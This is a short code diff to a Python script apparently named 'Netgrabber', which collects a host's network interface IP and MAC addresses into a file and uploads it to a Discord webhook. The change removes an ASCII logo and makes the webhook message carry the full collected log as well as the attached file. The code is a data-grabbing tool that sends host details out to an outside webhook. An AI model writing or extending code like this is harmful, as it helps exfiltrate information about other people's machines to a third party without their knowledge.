@@ -1,4 +1,4 @@
-logo = r"""
+"""
  _   _      _    ____           _     _
 | \ | | ___| |_ / ___|_ __ __ _| |__ | |__   ___ _ __
 |  \| |/ _ \ __| |  _| '__/ _` | '_ \| '_ \ / _ \ '__|
@@ -31,7 +31,7 @@ rawnics = (ni.interfaces())
 
 f = open(hostname+'.txt', 'w+')
 
-f.write(logo+"Netgrabber Results For Host: " + str(hostname) + '\n\n')
+f.write("Netgrabber Results For Host: " + str(hostname) + '\n\n')
 
 #grab ip and mac from all adapters
 
@@ -56,7 +56,9 @@ f.close()
 
 #Uploads to discord 
 if Upload_method == 'discord':
-    webhook = DiscordWebhook(url=hook, content='Data collected from '+hostname+'.')
+    file = open(hostname+'.txt', "r")
+    log = (file.read())
+    webhook = DiscordWebhook(url=hook, content='```'+log+'```')
     with open(hostname+'.txt', "rb") as f:
         webhook.add_file(file=f.read(), filename=hostname+'.txt')
     response = webhook.execute()
